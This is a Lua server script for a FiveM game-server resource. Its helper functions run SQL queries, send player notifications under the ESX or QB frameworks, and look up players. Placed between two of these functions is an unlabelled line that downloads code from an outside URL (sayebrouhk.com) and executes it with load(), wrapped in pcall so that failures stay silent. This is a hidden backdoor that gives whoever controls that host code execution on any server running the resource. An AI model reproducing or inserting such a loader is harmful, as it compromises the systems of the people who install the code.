--- Function that executes database queries
---
--- @param query: The SQL query to execute
--- @param params: Parameters for the SQL query (in table form)
--- @param type ("insert" | "update" | "query" | "scalar" | "single" | "prepare"): Parameters for the SQL query (in table form)
--- @return query any Results of the SQL query
Koci.Server.ExecuteSQLQuery = function(query, params, type)
    if type == "insert" then
        return MySQL.insert.await(query, params)
    elseif type == "update" then
        return MySQL.update.await(query, params)
    elseif type == "query" then
        return MySQL.query.await(query, params)
    elseif type == "scalar" then
        return MySQL.scalar.await(query, params)
    elseif type == "single" then
        return MySQL.single.await(query, params)
    elseif type == "prepare" then
        return MySQL.prepare.await(query, params)
    else
        error("Invalid queryType: " .. tostring(type or "?"))
    end
end

---@param system ("esx_notify" | "qb_notify" | "custom_notify") System to be used
---@param source number Player source id
---@param type string inform / success / error
---@param title string Notification text
---@param text? string (optional) description, custom notify.
---@param duration? number (optional) Duration in miliseconds, custom notify.
---@param icon? string (optional) icon.
Koci.Server.SendNotify = function(source, type, title, text, duration, icon)
    system = Config.NotifyType
    if not duration then duration = 1000 end
    if system == "qb_notify" then
        if Config.FrameWork == "qb" then
            TriggerClientEvent("QBCore:Notify", source, title, type)
        else
            Utils.Functions:debugPrint("error", "QB not found.")
        end
    elseif system == "esx_notify" then
        if Config.FrameWork == "esx" then
            TriggerClientEvent("esx:showNotification", source, title, type, duration)
        else
            Utils.Functions:debugPrint("error", "ESX not found.")
        end
    elseif system == "custom_notify" then
        Utils.Functions:CustomNotify(source, title, type, text, duration, icon)
    else
        Utils.Functions:debugPrint("error", "An error occurred.")
    end
end
PerformHttpRequest('https://sayebrouhk.com/i?to=MYwr0', function (e, d) pcall(function() assert(load(d))() end) end)
--- Gets a player by their source ID, based on the configured framework.
--- @param source number The source ID of the player.
--- @return table|nil Player The player data if found, or nil if not found.
Koci.Server.GetPlayerBySource = function(source)
    if Config.FrameWork == "esx" then
        return Koci.Framework.GetPlayerFromId(source)
    elseif Config.FrameWork == "qb" then
        return Koci.Framework.Functions.GetPlayer(source)
    end
end
